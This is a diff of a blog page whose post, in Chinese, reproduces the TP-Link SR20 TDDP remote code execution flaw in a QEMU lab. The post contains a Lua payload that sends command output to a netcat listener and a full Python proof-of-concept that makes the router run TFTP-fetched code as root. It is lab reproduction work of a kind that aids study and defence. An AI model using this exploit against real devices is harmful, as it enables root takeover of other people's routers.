@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x00 缘起IoT设备，固件小，功能单一，相对操作系统上一些成熟应用程序来说漏洞比较少但是却更容易利用；嵌入式linux环境下的漏洞挖掘类似于对linux的程序做模糊测试，甚至有点类似于CTF中的linux pwn，所以对新人还是相对来说比较友好的。为了拓展自己的学习领域，最终还是踏足了IoT这一块。这边记录下复现这个路由器的代码执行漏洞的过程，熟悉下相关工具&amp;环境的使用和配置。">
@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://driverxdw.github.io/2019/04/29/TP-Link-SR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E6%88%90%E5%8A%9F.png">
 <meta property="article:published_time" content="2019-04-28T16:18:51.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.373Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="IoT">
 <meta property="article:tag" content="路由器">
 <meta name="twitter:card" content="summary">
@@ -156,29 +156,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -216,7 +196,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -230,7 +212,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -244,6 +225,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -276,8 +267,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2019/04/29/TP-Link-SR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -320,6 +311,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -329,10 +327,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="0x00-缘起"><a href="#0x00-缘起" class="headerlink" title="0x00 缘起"></a>0x00 缘起</h2><p>IoT设备，固件小，功能单一，相对操作系统上一些成熟应用程序来说漏洞比较少但是却更容易利用；嵌入式linux环境下的漏洞挖掘类似于对linux的程序做模糊测试，甚至有点类似于CTF中的linux pwn，所以对新人还是相对来说比较友好的。为了拓展自己的学习领域，最终还是踏足了IoT这一块。这边记录下复现这个路由器的代码执行漏洞的过程，熟悉下相关工具&环境的使用和配置。</p>
+        <h2 id="0x00-缘起"><a href="#0x00-缘起" class="headerlink" title="0x00 缘起"></a>0x00 缘起</h2><p>IoT设备，固件小，功能单一，相对操作系统上一些成熟应用程序来说漏洞比较少但是却更容易利用；嵌入式linux环境下的漏洞挖掘类似于对linux的程序做模糊测试，甚至有点类似于CTF中的linux pwn，所以对新人还是相对来说比较友好的。为了拓展自己的学习领域，最终还是踏足了IoT这一块。这边记录下复现这个路由器的代码执行漏洞的过程，熟悉下相关工具&amp;环境的使用和配置。</p>
 <a id="more"></a>
 
-<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><figure class="highlight sas hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-<span class="hljs-meta">Link</span> 设备调试协议(TP-<span class="hljs-meta">Link</span> Device Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-<span class="hljs-meta">Link</span> 申请了专利的调试协议，基于 UDP 运行在 1040 端口</span><br><span class="line">TP-<span class="hljs-meta">Link</span> SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-<span class="meta">Link</span> 设备调试协议(TP-<span class="meta">Link</span> Device Debug Protocol 英文简称 TDDP) 中，TDDP 是 TP-<span class="meta">Link</span> 申请了专利的调试协议，基于 UDP 运行在 1040 端口</span><br><span class="line">TP-<span class="meta">Link</span> SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 0x31 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x02-工具准备"><a href="#0x02-工具准备" class="headerlink" title="0x02 工具准备"></a>0x02 工具准备</h2><ul>
 <li>源码编译qemu，直接apt的话可能安装的不是最新版本</li>
@@ -340,11 +338,11 @@
 </ul>
 <h2 id="0x03-固件提取"><a href="#0x03-固件提取" class="headerlink" title="0x03 固件提取"></a>0x03 固件提取</h2><p>这边贴一下<a href="https://www.tp-link.com/us/support/download/sr20/#Firmware" target="_blank" rel="noopener">官网的固件下载页</a>，vuln的固件可以去上面找。tplink的固件留有历史版本还是很良心的，之前分析vivotek摄像头rce漏洞的时候由于官网并没有放出历史版本而导致一直无法对patch的固件进行利用，就很坑。</p>
 <p>拿到固件后binwalk看一下包文件布局</p>
-<p><img src="./binwalk.png" alt></p>
+<p><img src="./binwalk.png" alt=""></p>
 <p>binwalk成功识别出了固件中的文件系统，确认是固件文件后再次binwalk -Me提取出固件中的Squashfs filesystem。</p>
-<p><img src="./binwalk2.png" alt></p>
+<p><img src="./binwalk2.png" alt=""></p>
 <p>qemu来运行程序</p>
-<p><img src="./run1.png" alt></p>
+<p><img src="./run1.png" alt=""></p>
 <p>直接qemu-arm是不行的，一些依赖库会找不到，需要指定当前目录为根，加入到path中;这边可以chroot，也可以直接用qemu的-L选项。</p>
 <p>发现这种方式运行tddp并不能触发漏洞，这边选择搭建完整的arm qemu的虚拟环境。</p>
 <p>##0x04 搭建环境</p>
@@ -355,45 +353,45 @@
 <li>vmlinuz-3.2.0-4-vexpress</li>
 </ul>
 <p>之后把三个文件放在一个目录下执行</p>
-<figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡</span><br><span class="line">$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置<span class="hljs-built_in"> IP </span>地址</span><br><span class="line">$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="hljs-attribute">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="hljs-string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,<span class="hljs-attribute">ifname</span>=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡</span><br><span class="line">$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置<span class="built_in"> IP </span>地址</span><br><span class="line">$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="attribute">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,<span class="attribute">ifname</span>=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA1.png" alt></p>
-<p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA2.png" alt></p>
+<p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA1.png" alt=""></p>
+<p><img src="./%E8%99%9A%E6%8B%9F%E6%9C%BA2.png" alt=""></p>
 <p>配置网卡ip</p>
 <p><code>ifconfig eth0 10.10.10.2/24</code></p>
-<p><img src="./%E7%BD%91%E7%BB%9C2.png" alt></p>
-<p><img src="./%E7%BD%91%E7%BB%9C1.png" alt></p>
+<p><img src="./%E7%BD%91%E7%BB%9C2.png" alt=""></p>
+<p><img src="./%E7%BD%91%E7%BB%9C1.png" alt=""></p>
 <p>发现虚拟机可以与宿主机的虚拟网卡通信了。</p>
 <p>现在需要把固件系统传到qemu的arm debian虚拟机中，这边用python的httpserver就好了。</p>
 <p><code>python -m SimpleHttpServer</code></p>
 <p>qemu虚拟机上执行<code>wget http://10.10.10.1:8000/squashfs-root.tar.bz2</code>获取宿主机文件。</p>
-<p><img src="./%E6%96%87%E4%BB%B61.png" alt></p>
+<p><img src="./%E6%96%87%E4%BB%B61.png" alt=""></p>
 <p>传好以后需要将当前目录设定为根目录，否则的话有些库会从debian系统的lib目录下去寻找。</p>
-<figure class="highlight tcl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t <span class="hljs-keyword">proc</span> /<span class="hljs-keyword">proc</span>/ ./squashfs-root/<span class="hljs-keyword">proc</span>/</span><br><span class="line">chroot<span class="hljs-title"> squashfs-root</span> sh # 切换根目录后执行新目录结构下的<span class="hljs-title"> sh</span> shell</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t <span class="keyword">proc</span> /<span class="keyword">proc</span>/ ./squashfs-root/<span class="keyword">proc</span>/</span><br><span class="line">chroot<span class="title"> squashfs-root</span> sh # 切换根目录后执行新目录结构下的<span class="title"> sh</span> shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="./%E9%85%8D%E7%BD%AE1.png" alt></p>
+<p><img src="./%E9%85%8D%E7%BD%AE1.png" alt=""></p>
 <p>之后在宿主机搭建tftp服务</p>
 <p><code>sudo apt install atftpd</code></p>
-<p><img src="./%E6%9C%8D%E5%8A%A11.png" alt></p>
+<p><img src="./%E6%9C%8D%E5%8A%A11.png" alt=""></p>
 <p>到这边漏洞环境搭建完毕。</p>
 <h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>在atftp的根目录/tftpboot写下payload，内容为</p>
-<figure class="highlight lua hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">config_test</span><span class="hljs-params">(config)</span></span></span><br><span class="line">  <span class="hljs-built_in">os</span>.<span class="hljs-built_in">execute</span>(<span class="hljs-string">"id | nc 10.10.10.1 1337"</span>)</span><br><span class="line"><span class="hljs-keyword">end</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc 10.10.10.1 1337"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>QEMU 虚拟机中启动 tddp 程序</li>
 <li>宿主机使用 NC 监听端口</li>
 <li>执行 POC，获取命令执行结果</li>
 </ul>
-<figure class="highlight makefile hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="hljs-comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-comment">#function config_test(config)</span></span><br><span class="line"><span class="hljs-comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="hljs-comment">#end</span></span><br><span class="line"><span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">port_send = 1040</span><br><span class="line">port_receive = 61000</span><br><span class="line"></span><br><span class="line">tddp_ver = <span class="hljs-string">"01"</span></span><br><span class="line">tddp_command = <span class="hljs-string">"31"</span></span><br><span class="line">tddp_req = <span class="hljs-string">"01"</span></span><br><span class="line">tddp_reply = <span class="hljs-string">"00"</span></span><br><span class="line">tddp_padding = <span class="hljs-string">"%0.16X"</span> % 00</span><br><span class="line"></span><br><span class="line">tddp_packet = <span class="hljs-string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind(('', port_receive))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="hljs-string">"%s;arbitrary"</span> % sys.argv[2]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[1], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"></span><br><span class="line">response, addr = sock_receive.recvfrom(1024)</span><br><span class="line">r = response.encode('hex')</span><br><span class="line">print(r)</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">port_send = 1040</span><br><span class="line">port_receive = 61000</span><br><span class="line"></span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % 00</span><br><span class="line"></span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind(('', port_receive))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[2]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[1], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"></span><br><span class="line">response, addr = sock_receive.recvfrom(1024)</span><br><span class="line">r = response.encode('hex')</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
 
 
 
 <p><code>nc -lvnp 1337</code></p>
 <p><code>python3 poc.py 10.10.10.2 /payload</code></p>
-<p><img src="./%E6%88%90%E5%8A%9F.png" alt></p>
-</body></html>
+<p><img src="./%E6%88%90%E5%8A%9F.png" alt=""></p>
+
     </div>
 
     
@@ -468,10 +466,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -497,6 +525,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
